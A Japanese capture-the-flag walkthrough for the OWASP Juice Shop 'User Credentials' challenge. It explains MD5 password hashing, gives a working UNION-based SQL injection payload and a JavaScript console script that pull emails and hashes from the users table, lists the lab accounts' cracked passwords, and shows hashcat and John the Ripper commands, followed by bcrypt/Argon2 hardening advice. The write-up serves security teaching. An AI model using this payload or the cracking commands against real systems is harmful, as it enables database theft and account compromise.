# User Credentials ✅

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** SQLi (UNION攻撃) + パスワードクラッキング
**目標:** 全ユーザーのメールアドレスとパスワードハッシュを取得し、解読する

---

## 背景知識

### パスワードハッシュとは

パスワードはデータベースに**平文で保存してはいけない**。代わりに「ハッシュ」という一方向変換を適用して保存する。

```
┌─────────────────────────────────────────────────────────────────┐
│                     パスワードハッシュの仕組み                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【登録時】                                                      │
│  パスワード: "admin123"                                         │
│       │                                                         │
│       ▼ ハッシュ関数 (MD5)                                      │
│       │                                                         │
│  ハッシュ: "0192023a7bbd73250516f069df18b500"                   │
│       │                                                         │
│       ▼ DBに保存                                                │
│                                                                 │
│  【ログイン時】                                                  │
│  入力: "admin123"                                               │
│       │                                                         │
│       ▼ 同じハッシュ関数                                        │
│       │                                                         │
│  計算結果: "0192023a7bbd73250516f069df18b500"                   │
│       │                                                         │
│       ▼ DBのハッシュと比較 → 一致すればログイン成功              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### なぜハッシュが漏洩すると危険か

ハッシュは「一方向」なので、理論上は元のパスワードに戻せない。しかし...

```
┌─────────────────────────────────────────────────────────────────┐
│                     パスワードクラッキング手法                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【辞書攻撃】                                                    │
│  よく使われるパスワードリストを用意:                              │
│  password, 123456, admin123, ...                                │
│       │                                                         │
│       ▼ 全部ハッシュ化                                          │
│       │                                                         │
│  漏洩したハッシュと比較 → 一致すれば解読成功                     │
│                                                                 │
│  【レインボーテーブル】                                          │
│  事前計算済みの「パスワード→ハッシュ」対応表:                     │
│  "admin123" → "0192023a..."                                     │
│  "password" → "5f4dcc3b..."                                     │
│       │                                                         │
│       ▼ 漏洩ハッシュで逆引き → 瞬時に解読                       │
│                                                                 │
│  【ブルートフォース】                                            │
│  全パターンを総当たり:                                           │
│  a, b, c, ... aa, ab, ... → 時間はかかるが必ず見つかる         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### MD5 の問題点

MD5 は1991年に設計された古いハッシュ関数。現在は**暗号学的に破られて**おり、パスワードハッシュには不適切。

| 問題 | 説明 |
|------|------|
| **高速すぎる** | GPU で秒間数十億回計算可能 → ブルートフォースが容易 |
| **ソルトなし** | 同じパスワード → 同じハッシュ → レインボーテーブル攻撃に脆弱 |
| **衝突発見** | 異なる入力で同じハッシュを作成可能（偽造リスク） |

---

## 思考プロセス

### ステップ1: Database Schema チャレンジの成果を活用

```
「Database Schema で users テーブルの構造が分かった」
    ↓
「カラム: id, email, password, role, ...」
    ↓
「password カラムにハッシュが保存されているはず」
    ↓
「UNION SELECT で email と password を抽出しよう」
```

### ステップ2: UNION クエリの調整

```
「Database Schema: ')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--」
    ↓
「sql の代わりに id,email,password を指定」
    ↓
「')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--」
```

### ステップ3: ハッシュの取得

```
「クエリを実行」
    ↓
「検索結果に users テーブルの内容が表示される」
    ↓
「email と password (ハッシュ) のペアを取得」
```

### ステップ4: ハッシュの解読

```
「取得したハッシュを解読サービスに入力」
    ↓
「32文字の16進数 → MD5 ハッシュと判明」
    ↓
「CrackStation でレインボーテーブル検索」
    ↓
「よく使われるパスワードは数秒で解読」
```

---

## 実行手順

### Step 1: UNION SQLi でユーザー情報を取得

検索バーに以下を入力:

```sql
')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
```

### Step 2: 結果を確認

検索結果に商品ではなくユーザー情報が表示される:

| id | email | password (MD5 hash) |
|----|-------|---------------------|
| 1 | admin@juice-sh.op | 0192023a7bbd73250516f069df18b500 |
| 2 | jim@juice-sh.op | e541ca7ecf72b8d1286474fc613e5e45 |
| 3 | bender@juice-sh.op | 0c36e517e3fa95aabf1bbffc6744a4ef |
| ... | ... | ... |

### Step 3: ハッシュを解読

1. https://crackstation.net/ にアクセス
2. 取得したハッシュをコピー＆ペースト
3. 「Crack Hashes」をクリック
4. 数秒で元のパスワードが表示される

### Step 4: JavaScript で一括取得（オプション）

```javascript
// Console で実行
const result = await fetch('/rest/products/search?q=' + encodeURIComponent("')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--"))
  .then(r => r.json());

// ユーザー情報を整形して表示
result.data.forEach(user => {
  console.log(`Email: ${user.name}`);  // email が name カラムに
  console.log(`Hash: ${user.description}`);  // password が description に
  console.log('---');
});
```

---

## 解読されたパスワード一覧

| ユーザー | MD5 ハッシュ | パスワード | 元ネタ |
|---------|------------|-----------|--------|
| admin@juice-sh.op | `0192023a7bbd73250516f069df18b500` | admin123 | よくあるパスワード |
| jim@juice-sh.op | `e541ca7ecf72b8d1286474fc613e5e45` | ncc-1701 | スタートレック (USS Enterprise) |
| bender@juice-sh.op | `0c36e517e3fa95aabf1bbffc6744a4ef` | OhG0dPlease1nsertLiquor | Futurama |
| mc.safesearch@juice-sh.op | `b03f4b0ba8b458b4a66f67b5f3ef8977` | Mr. N00dles | South Park |
| amy@juice-sh.op | `030f05e45e30710c3ad3c32f00de0473` | K1f.................... | Futurama |

### パスワードの傾向

- **弱いパスワード**: admin123、password など
- **ポップカルチャー参照**: ncc-1701（スタートレック）、キャラクター名
- **Leet speak**: N00dles (Noodles)、K1f (Kif)

---

## ハッシュ形式の識別

```
┌─────────────────────────────────────────────────────────────────┐
│                     ハッシュ形式の特徴                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  MD5:      32文字 (128bit)                                     │
│            例: 0192023a7bbd73250516f069df18b500                 │
│                                                                 │
│  SHA-1:    40文字 (160bit)                                     │
│            例: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8         │
│                                                                 │
│  SHA-256:  64文字 (256bit)                                     │
│            例: 8c6976e5b5410415bde908bd4dee15dfb167a9c87...    │
│                                                                 │
│  bcrypt:   $2a$ または $2b$ で始まる                            │
│            例: $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92...    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## パスワードクラッキングツール

### オンラインサービス

| サービス | 特徴 |
|---------|------|
| [CrackStation](https://crackstation.net/) | 150億エントリのレインボーテーブル |
| [Hashes.com](https://hashes.com/en/decrypt/hash) | コミュニティ共有型 |
| [MD5Decrypt](https://md5decrypt.net/) | MD5 特化 |

### オフラインツール

```bash
# Hashcat (GPU 高速クラッキング)
hashcat -m 0 -a 0 hashes.txt wordlist.txt
# -m 0: MD5
# -a 0: 辞書攻撃

# John the Ripper
john --format=raw-md5 hashes.txt --wordlist=rockyou.txt
```

---

## 安全なパスワードハッシュ

### 推奨アルゴリズム

| アルゴリズム | 特徴 | 推奨度 |
|------------|------|--------|
| **Argon2** | 最新、メモリハード | ⭐⭐⭐⭐⭐ |
| **bcrypt** | 実績あり、広くサポート | ⭐⭐⭐⭐ |
| **scrypt** | メモリハード | ⭐⭐⭐⭐ |
| PBKDF2 | 古いが許容 | ⭐⭐⭐ |
| SHA-256 | ソルトなしは危険 | ⭐⭐ |
| MD5 | **使用禁止** | ❌ |

### 安全な実装例

```javascript
// Node.js での bcrypt 使用例
const bcrypt = require('bcrypt');

// ハッシュ生成（登録時）
const saltRounds = 12;  // コスト係数
const hash = await bcrypt.hash('password123', saltRounds);
// → "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/X4.FOpI..."

// 検証（ログイン時）
const isValid = await bcrypt.compare('password123', hash);
// → true or false
```

### なぜ bcrypt/Argon2 が安全か

1. **ソルト**: 同じパスワードでも異なるハッシュ → レインボーテーブル無効化
2. **ストレッチング**: 計算を意図的に遅くする → ブルートフォース困難
3. **コスト調整**: 将来のハードウェア進化に対応可能

---

## 関連チャレンジ

- [Database Schema](../difficulty-3/database-schema.md) - テーブル構造の取得
- [Login Jim](../difficulty-3/login-jim.md) - 特定ユーザーへのSQLi
- [Login Bender](../difficulty-3/login-bender.md) - パスワードを使ったログイン
- [Two Factor Authentication](../difficulty-5-6/two-factor-authentication.md) - TOTP シークレットの抽出

## 参考リンク

- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [CrackStation - Online Hash Cracker](https://crackstation.net/)
- [Hashcat Wiki](https://hashcat.net/wiki/)
- [Have I Been Pwned](https://haveibeenpwned.com/) - パスワード漏洩チェック
